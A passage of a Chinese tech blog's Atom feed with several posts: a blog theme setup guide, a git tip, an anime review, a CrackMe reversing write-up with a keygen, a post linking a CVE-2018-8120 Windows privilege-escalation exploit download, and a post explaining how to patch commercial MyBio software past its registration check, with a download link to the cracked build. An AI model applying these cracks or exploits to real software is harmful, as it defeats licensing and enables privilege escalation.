class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">site:</span></span><br><span class="line"><span class="attr">    title:</span> <span class="string">"Akkuman"</span></span><br><span class="line"><span class="attr">    subtitle:</span> <span class="string">"Akkuman的技术博客"</span></span><br><span class="line"><span class="attr">    limit:</span> <span class="number">8</span></span><br><span class="line"><span class="attr">    theme:</span> <span class="string">ink-theme-story</span></span><br><span class="line"><span class="attr">    lang:</span> <span class="string">zh</span></span><br><span class="line"><span class="attr">    url:</span> <span class="string">"ink-theme-story.pancakeapps.com"</span></span><br><span class="line"><span class="attr">    comment:</span> <span class="string">Akkuman</span></span><br><span class="line"><span class="attr">    logo:</span> <span class="string">"-/images/avatar.png"</span></span><br><span class="line">    <span class="comment"># link: "&#123;category&#125;/&#123;year&#125;/&#123;month&#125;/&#123;day&#125;/&#123;title&#125;.html"</span></span><br><span class="line"><span class="attr">    link:</span> <span class="string">"&#123;year&#125;/&#123;month&#125;/&#123;day&#125;/&#123;title&#125;.html"</span></span><br><span class="line">    <span class="comment"># root: "/blog"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">authors:</span></span><br><span class="line"><span class="attr">    me:</span></span><br><span class="line"><span class="attr">        name:</span> <span class="string">"Akkuman"</span></span><br><span class="line"><span class="attr">        intro:</span> <span class="string">"编程小白|技术菜鸟"</span></span><br><span class="line"><span class="attr">        avatar:</span> <span class="string">"-/images/avatar.png"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">build:</span></span><br><span class="line">    <span class="comment"># output: "public"</span></span><br><span class="line"><span class="attr">    port:</span> <span class="number">8000</span></span><br><span class="line">    <span class="comment"># Copied files to public folder when build</span></span><br><span class="line"><span class="attr">    copy:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">"source/images"</span></span><br><span class="line">    <span class="comment"># Excuted command when use 'ink publish'</span></span><br><span class="line"><span class="attr">    publish:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        git add . -A</span></span><br><span class="line"><span class="string">        git commit -m "update"</span></span><br><span class="line"><span class="string">        git push origin</span></span><br></pre></td></tr></table></figure><p>我们需要<strong>修改</strong>的地方有:<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">title</span>   <span class="comment">#title字段是截图中的左上角Akkuman字段, 比如我设置为Akkuman那么就是和我截图中一样</span></span><br><span class="line"><span class="string">subtitle</span>    <span class="comment">#网站子标题, 在标签页和归档能看到</span></span><br><span class="line"><span class="attr">limit:</span> <span class="number">8</span>    <span class="comment">#每页可显示的文章数目, 为了美观建议设置为8</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">ink-theme-story</span>    <span class="comment">#网站主题目录, 设置为该主题ink-theme-story</span></span><br></pre></td></tr></table></figure></p><p>其他地方根据自己需求更改, 纸小墨说明文档见<a href="http://www.chole.io/blog/ink-blog-tool.html" target="_blank" rel="noopener">简洁的静态博客构建工具 —— 纸小墨（InkPaper）</a></p><h3 id="关于页面"><a href="#关于页面" class="headerlink" title="关于页面"></a>关于页面</h3><p>在纸小墨中,每篇文章是有作者的,我现在按上面我给出的例子配置为例进行说明</p><p>纸小墨中每一篇文章的头配置大致如下: </p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">"简洁的静态博客构建工具 —— 纸小墨（InkPaper）"</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2015</span><span class="bullet">-03</span><span class="bullet">-01</span> <span class="number">18</span><span class="string">:00:00</span> <span class="string">+0800</span></span><br><span class="line"><span class="attr">update:</span> <span class="number">2016</span><span class="bullet">-07</span><span class="bullet">-11</span> <span class="number">17</span><span class="string">:00:00</span> <span class="string">+0800</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">me</span></span><br><span class="line"><span class="attr">cover:</span> <span class="string">"-/images/example.png"</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">设计</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">写作</span></span><br><span class="line"><span class="attr">preview:</span> <span class="string">纸小墨（InkPaper）是一个GO语言编写的开源静态博客构建工具，可以快速搭建博客网站。它无依赖跨平台，配置简单构建快速，注重简洁易用与更优雅的排版。</span></span><br></pre></td></tr></table></figure><p>其中的<code>preview</code>是文章预览，也可在正文中使用<code>&lt;!--more--&gt;</code>分割, 是一个可选字段,我们不必管</p><p>对我们有影响的字段配置除了基础的<code>title</code>等等之外, 需要关注一下<code>author</code>这个字段</p><p>纸小墨每一篇文章的作者的关于页面是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">about.&#123;&#123;.Author.Id&#125;&#125;.html</span><br></pre></td></tr></table></figure><p>比如我上面的站点配置文件中<code>authors</code>有一个值是<code>me</code>, 那么这个作者的关于页面就是<code>about.me.html</code>, 也就是我们需要建立一个page, 纸小墨主程序打包中有一个文件<code>about.me.md</code>, 可以参见这个文件的格式, 我在这里给出来: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">type: page</span><br><span class="line">title: &quot;关于作者&quot;</span><br><span class="line">author: me</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">## 纸小墨</span><br><span class="line"></span><br><span class="line">构建只为纯粹书写的博客。</span><br><span class="line"></span><br><span class="line">[http://www.chole.io/](http://www.chole.io/)</span><br></pre></td></tr></table></figure><p>那么这个文件生成后就会在站点根目录下生成<code>about.me.html</code>文件.</p><p><strong>重点来了</strong></p><p>上面我说的关于页面是单个作者的关于页面, 在这个主题中, 我有定义一个站点的关于页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123;.Site.Root&#125;&#125;/about.html"</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123;i18n "about"&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们只需要按照上面<code>about.me.md</code>的格式新建一个<code>about.md</code>即可, 我在这里给出一个<code>about.md</code>例子: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">type: page</span><br><span class="line">title: &quot;关于本站&quot;</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">我是一个站点关于页面例子</span><br></pre></td></tr></table></figure><p><code>author</code>字段可省略,看自己的喜好</p><h3 id="评论系统切换"><a href="#评论系统切换" class="headerlink" title="评论系统切换"></a>评论系统切换</h3><p>本主题的评论采用点击再动态加载的方式, 所以不用担心因为Disqus被墙的原因导致页面打不开, 只有当你点击<code>show comments</code>时才会开始加载评论</p><p>本主题的评论系统支持来必力, Disqus, Gitment</p><h4 id="来必力Livere"><a href="#来必力Livere" class="headerlink" title="来必力Livere"></a>来必力Livere</h4><p>切换为来必力的话只需要修改站点配置文件<code>blog/config.yml</code>, 把<code>comment</code>字段的值修改成来必力的<code>data-uid</code>(<em>可在来必力后台代码管理中看到</em>), 然后打开<code>blog/ink-theme-story/_comment.html</code>文件, 把来必力评论的注释去掉, 然后把Disqus评论加上注释即可</p><h4 id="Gitment"><a href="#Gitment" class="headerlink" title="Gitment"></a>Gitment</h4><p>切换为Gitment的话同上修改, <code>comment</code>字段的格式为</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">comment:</span> <span class="string">"owner:repo:client_id:client_secret"</span></span><br></pre></td></tr></table></figure><p>其中各个的属性为</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">owner</span>           <span class="comment">#你的 GitHub ID</span></span><br><span class="line"><span class="string">repo</span>            <span class="comment">#存储评论的 repo</span></span><br><span class="line"><span class="string">client_id</span>       <span class="comment">#你的 client ID</span></span><br><span class="line"><span class="string">client_secret</span>   <span class="comment">#你的 client secret</span></span><br></pre></td></tr></table></figure><p>然后打开<code>blog/ink-theme-story/_comment.html</code>文件, 把Gitment评论的注释去掉, 然后把Disqus评论加上注释即可</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><h3 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h3><p>特别感谢<a href="https://yumoe.com" target="_blank" rel="noopener">Yumoe</a>提供了这么简洁大方的主题</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;主题介绍&quot;&gt;&lt;a href=&quot;#主题介绍&quot; class=&quot;headerlink&quot; title=&quot;主题介绍&quot;&gt;&lt;/a&gt;主题介绍&lt;/h2&gt;&lt;p&gt;为纸小墨写的一款主题,该主题移植自&lt;a href=&quot;https://yumoe.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Yumoe&lt;/a&gt;&lt;br&gt;&lt;!--和[Artifact.](https://artifact.me/)--&gt;&lt;/p&gt;
&lt;p&gt;github地址：&lt;a href=&quot;https://github.com/akkuman/ink-theme-story&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ink-theme-story&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Demo&quot;&gt;&lt;a href=&quot;#Demo&quot; class=&quot;headerlink&quot; title=&quot;Demo&quot;&gt;&lt;/a&gt;Demo&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://ink-theme-story.pancakeapps.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ink-theme-story&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="theme" scheme="http://hacktech.cn/categories/theme/"/>
    
    
      <category term="theme" scheme="http://hacktech.cn/tags/theme/"/>
    
  </entry>
  
  <entry>
    <title>git忽略对已入库文件的修改</title>
    <link href="http://hacktech.cn/2018/08/22/git-update-index.html"/>
    <id>http://hacktech.cn/2018/08/22/git-update-index.html</id>
    <published>2018-08-22T07:18:42.000Z</published>
    <updated>2018-09-08T06:50:11.307Z</updated>
    
    <content type="html"><![CDATA[<p>项目开发过程中，会遇到本地配置文件每个开发人员不同的情况，但如果遇到类似数据库配置这种最终需要加入 git 版本控制的配置，则会陷入两难境地。要么不跟踪，要么有人提交后其他人同步下来必须手动修改，非常麻烦。其实，对于已被纳入版本管理的文件，git 也提供了很好的解决办法。</p><a id="more"></a><ul><li><p>告诉git<strong>忽略</strong>对已经纳入版本管理的文件 <code>.classpath</code> 的修改，git 会一直忽略此文件直到重新告诉 git 可以再次跟踪此文件 <code>$ git update-index --assume-unchanged .classpath</code></p></li><li><p>告诉 git <strong>恢复跟踪</strong> <code>$ git update-index --assume-unchanged .classpath</code></p></li><li><p><strong>查看</strong>当前被忽略的、已经纳入版本库管理的文件：<code>$ git ls-files -v | grep -e &quot;^[hsmrck]&quot;</code></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;项目开发过程中，会遇到本地配置文件每个开发人员不同的情况，但如果遇到类似数据库配置这种最终需要加入 git 版本控制的配置，则会陷入两难境地。要么不跟踪，要么有人提交后其他人同步下来必须手动修改，非常麻烦。其实，对于已被纳入版本管理的文件，git 也提供了很好的解决办法。&lt;/p&gt;
    
    </summary>
    
      <category term="git" scheme="http://hacktech.cn/categories/git/"/>
    
    
      <category term="git" scheme="http://hacktech.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-8120 Windows权限提升</title>
    <link href="http://hacktech.cn/2018/05/18/CVE-2018-8120.html"/>
    <id>http://hacktech.cn/2018/05/18/CVE-2018-8120.html</id>
    <published>2018-05-18T11:55:06.000Z</published>
    <updated>2018-09-08T06:50:11.307Z</updated>
    
    <content type="html"><![CDATA[<p>来源 : <a href="https://github.com/bigric3/cve-2018-8120" target="_blank" rel="noopener">bigric3/cve-2018-8120</a></p><p>Detail : <a href="http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html" target="_blank" rel="noopener">cve-2018-8120-analysis-and-exploit</a></p><a id="more"></a><h2 id="演示图"><a href="#演示图" class="headerlink" title="演示图"></a>演示图</h2><p><img src="https://github.com/bigric3/cve-2018-8120/raw/master/exploit.gif" alt="exploit.gif"></p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="https://github.com/akkuman/cve-2018-8120/releases" target="_blank" rel="noopener">CVE-2018-8120.zip</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;来源 : &lt;a href=&quot;https://github.com/bigric3/cve-2018-8120&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;bigric3/cve-2018-8120&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Detail : &lt;a href=&quot;http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;cve-2018-8120-analysis-and-exploit&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://hacktech.cn/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
    
      <category term="提权" scheme="http://hacktech.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>补番完了 来自深渊</title>
    <link href="http://hacktech.cn/2018/04/27/made-in-abyss.html"/>
    <id>http://hacktech.cn/2018/04/27/made-in-abyss.html</id>
    <published>2018-04-27T13:31:55.000Z</published>
    <updated>2018-09-08T06:50:11.307Z</updated>
    
    <content type="html"><![CDATA[<p>这两天把来自深渊补番完了，治愈系？不是，看起来画风确实是这样，但是细看之下其实能感受到故事所描述的残忍与黑暗。</p><a id="more"></a><p>莉可的身世原来只是一个可以动的尸体，原来除咒之笼并不能抵抗深渊的诅咒。</p><p>其实可以细想，莉可在上升的过程中不断承受诅咒一次次的死亡。</p><p>在见到不动卿奥森的时候，奥森告诉了莉可这个残酷的事实，而却没有过多的对莉可心理进行描述，全是描写的奥森和累格，还真是无情呢。</p><p>我挺喜欢奥森这个人的，孤傲或者说傲娇。 </p><p>在巨人之杯，剧情画风急转而下，莉可的濒死是如此真实。</p><p>都说娜娜琪是老婆，其实我觉得娜娜琪这个人物挺可悲的，不是因为他的经历，当然他的经历是一部分，我觉得我觉得他可悲更多是他从来没有为过自己做过什么事情，一直活在期待之中。</p><p>另外，我想说一下，娜娜琪不是男孩子吗，为什么是老婆。</p><p>下一季应该会碰到黎明卿了，感觉他这个人挺黑暗的，不知道具体怎样。</p><p><img src="https://i.loli.net/2018/04/27/5ae3271829c4f.png" alt="860634.png"></p><p><img src="https://i.loli.net/2018/04/27/5ae32734151eb.png" alt="880846.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这两天把来自深渊补番完了，治愈系？不是，看起来画风确实是这样，但是细看之下其实能感受到故事所描述的残忍与黑暗。&lt;/p&gt;
    
    </summary>
    
      <category term="anime" scheme="http://hacktech.cn/categories/anime/"/>
    
    
      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
    
      <category term="anime" scheme="http://hacktech.cn/tags/anime/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe第十九Brad Soblesky.2</title>
    <link href="http://hacktech.cn/2018/03/02/160CrackMe-019.html"/>
    <id>http://hacktech.cn/2018/03/02/160CrackMe-019.html</id>
    <published>2018-03-02T13:42:41.000Z</published>
    <updated>2018-09-08T06:50:11.307Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1foyrcq7eydj207004jgli.jpg" alt=""><br><a id="more"></a></p><p>查壳无壳，vc写的。  </p><p>我们输入假码后，然后点击，弹出错误框，直接打开od，对<code>MessageBoxA</code>下断点也行，寻找字符串也行。</p><p>一般的错误提示部分代码类似于这样。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">call xxx</span><br><span class="line">test xxx,xxx</span><br><span class="line">je xxxerror</span><br><span class="line">...</span><br><span class="line">jmp xxx</span><br><span class="line">push xxx ;xxxerror</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">call error</span><br></pre></td></tr></table></figure></p><p>只需要往上找到关键跳直接nop就行。不过我们需要跟踪一下算法。</p><p>我们找到关键跳的<code>call</code>上方下断，可以看到他把一个东西压栈了，可以猜想是真码。</p><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1foyroy9x6yj20zm0g1ae2.jpg" alt=""></p><p>然后我们测试一下111111和1643803416，提示正确，那我们找到这段的段首下断，然后f9运行程序重新输入假码点击Check。重点观察1643803416的出现地。</p><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1foyrt7stnaj20wx0ecdj6.jpg" alt=""></p><p>我们可以看到在关键<code>call</code>的前方不远处就有出现，那么这个<code>add</code>前方的<code>call</code>是加密算法<code>call</code>吗？</p><p>显然不是的，我们可以看到这个<code>CString::Format</code>明显是对一个东西进行字符串格式化，格式是<code>%lu</code>(无符号长整数)，另外我们可以在它上面Enter跟一跟，可以发现直接从程序领空跳到系统领空了。所以我们可以猜测前面肯定是1643803416的一个什么数学形式然后用<code>%lu</code>格式化输出，我们可以推测是16进制，然后我们再重新来注意一下前面。</p><p>我们发现了1643803416的十六进制，在上方有个循环。其实之前在f8下来的时候，那个循环我们就可以推测是算法，现在经过分析可以更加肯定了。<code>mov eax,[local.4]</code>这个是这个循环最终跳出来的地方，那么<code>local.4</code>那里就是我们所需要找的东西。</p><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1foys1xvfuoj20rb0bwgnu.jpg" alt=""></p><p>在我们之前的两边跟中，我们可以测试发现<code>local.7</code>是你输入的Name的长度，<code>local.5</code>是我们输入的名字。</p><p>我们把上面的循环好好跟一遍。下面直接看我注释理解吧。对了，我们跟踪过程中也可以发现Name长度不能小于5，就在这个循环上方有个简单的判断。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">004015BE  |&gt; \C745 E0 00000&gt;mov [local.8],0x0</span><br><span class="line">004015C5  |.  EB 09         jmp short Brad_Sob.004015D0</span><br><span class="line">004015C7  |&gt;  8B55 E0       /mov edx,[local.8]</span><br><span class="line">004015CA  |.  83C2 01       |add edx,0x1</span><br><span class="line">004015CD  |.  8955 E0       |mov [local.8],edx                       ;  local8第一次进入循环为0，后续循环每次+1</span><br><span class="line">004015D0  |&gt;  8B45 E0        mov eax,[local.8]</span><br><span class="line">004015D3  |.  3B45 E4       |cmp eax,[local.7]                       ;  local7 = len(name)</span><br><span class="line">004015D6  |.  7D 42         |jge short Brad_Sob.0040161A             ;  当local8&gt;=len(name)跳出循环</span><br><span class="line">004015D8  |.  8B4D E0       |mov ecx,[local.8]</span><br><span class="line">004015DB  |.  51            |push ecx</span><br><span class="line">004015DC  |.  8D4D EC       |lea ecx,[local.5]                       ;  local5=name</span><br><span class="line">004015DF  |.  E8 1C030000   |call Brad_Sob.00401900                  ;  取name[local8]的十六进制ascii放入al</span><br><span class="line">004015E4  |.  0FBED0        |movsx edx,al</span><br><span class="line">004015E7  |.  8B45 F0       |mov eax,[local.4]                       ;  local4初始值为0x81276345</span><br><span class="line">004015EA  |.  03C2          |add eax,edx</span><br><span class="line">004015EC  |.  8945 F0       |mov [local.4],eax                       ;  local4 += name[local8]的十六进制</span><br><span class="line">004015EF  |.  8B4D E0       |mov ecx,[local.8]</span><br><span class="line">004015F2  |.  C1E1 08       |shl ecx,0x8</span><br><span class="line">004015F5  |.  8B55 F0       |mov edx,[local.4]</span><br><span class="line">004015F8  |.  33D1          |xor edx,ecx</span><br><span class="line">004015FA  |.  8955 F0       |mov [local.4],edx                       ;  local4 = (local8&lt;&lt;8)^local4</span><br><span class="line">004015FD  |.  8B45 E0       |mov eax,[local.8]</span><br><span class="line">00401600  |.  83C0 01       |add eax,0x1</span><br><span class="line">00401603  |.  8B4D E4       |mov ecx,[local.7]</span><br><span class="line">00401606  |.  0FAF4D E0     |imul ecx,[local.8]</span><br><span class="line">0040160A  |.  F7D1          |not ecx</span><br><span class="line">0040160C  |.  0FAFC1        |imul eax,ecx                            ;  eax = (~(len(name)*local8))*(local8+1)</span><br><span class="line">0040160F  |.  8B55 F0       |mov edx,[local.4]</span><br><span class="line">00401612  |.  0FAFD0        |imul edx,eax</span><br><span class="line">00401615  |.  8955 F0       |mov [local.4],edx                       ;  local4 *= eax</span><br><span class="line">00401618  |.^ EB AD         \jmp short Brad_Sob.004015C7</span><br><span class="line">0040161A  |&gt;  8B45 F0       mov eax,[local.4]</span><br></pre></td></tr></table></figure><p>相信结合我的注释自己细看一遍应该不太费力。下面直接写注册算法。其实上面的基本上用伪代码都写的比较明白了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// name为输入的第一个值 </span></span><br><span class="line"><span class="keyword">char</span>* name = <span class="string">"111111"</span>;</span><br><span class="line"><span class="keyword">int</span> len_name = <span class="built_in">strlen</span>(name);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len_name&lt;<span class="number">5</span>)</span><br><span class="line"><span class="comment">// name小于5出现提示并退出 </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"User Name must have at least 5 characters.\n"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">long</span> result = <span class="number">0x81276345</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len_name; i++)</span><br><span class="line">&#123;</span><br><span class="line">result += name[i];</span><br><span class="line">result ^= (i&lt;&lt;<span class="number">8</span>);</span><br><span class="line">result *= ~(len_name*i)*(i+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"result: %lu\n"</span>,result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/c0264382gy1foyrcq7eydj207004jgli.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="CrackMe" scheme="http://hacktech.cn/tags/CrackMe/"/>
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>MyBio小隐本记注册破解</title>
    <link href="http://hacktech.cn/2018/02/28/MyBio-Crack.html"/>
    <id>http://hacktech.cn/2018/02/28/MyBio-Crack.html</id>
    <published>2018-02-28T13:40:44.000Z</published>
    <updated>2018-09-08T06:50:11.307Z</updated>
    
    <content type="html"><![CDATA[<p>既然开始了，就把这一个系列的都破了算了，这次主角小隐本记MyBio</p><a id="more"></a><p>和WDTP的原理是差不多的，先把软件界面换成e文，然后写了15个记录后提示注册，一样的路子，直接跳过注册窗口的弹出就好了</p><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fowhkbesvuj20b0088t8x.jpg" alt="注册窗口"></p><p>然后查壳一样是vs2015的无壳64位程序，直接附加到x64dbg，然后有了之前WDTP的经验，我们直接找弹出注册窗口的地方，查找字符串，然后搜索上图中<code>Serial-number:</code></p><p>一样的，找到了注册窗体生成的地方，在段首下个断，然后回溯一次，可以看到</p><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fowhspimgmj20q507vgmx.jpg" alt=""></p><p>直接把这个call上方的jle改成jmp即可爆破。</p><hr><p>软件下载地址：</p><p><a href="https://share.weiyun.com/f5a48a92d8f458277e937dadc730a5ad" target="_blank" rel="noopener">密码：0yb0cz</a></p><p>解压后注意校验</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">大小: 4181504 字节</span><br><span class="line">文件版本: 2.1.1004</span><br><span class="line">修改时间: 2018年2月28日, 21:27:02</span><br><span class="line">MD5: EEA6B0BF010E45EA7EF340FFB543C316</span><br><span class="line">SHA1: BAA4BE7B3F2DE0F75996C0E9BE8DA0C177444CE8</span><br><span class="line">CRC32: 999277D5</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;既然开始了，就把这一个系列的都破了算了，这次主角小隐本记MyBio&lt;/p&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>WDTP注册破解</title>
    <link href="http://hacktech.cn/2018/02/26/WDTP-Crack.html"/>
    <id>http://hacktech.cn/2018/02/26/WDTP-Crack.html</id>
    <published>2018-02-26T12:34:50.000Z</published>
    <updated>2018-09-08T06:50:11.307Z</updated>
    
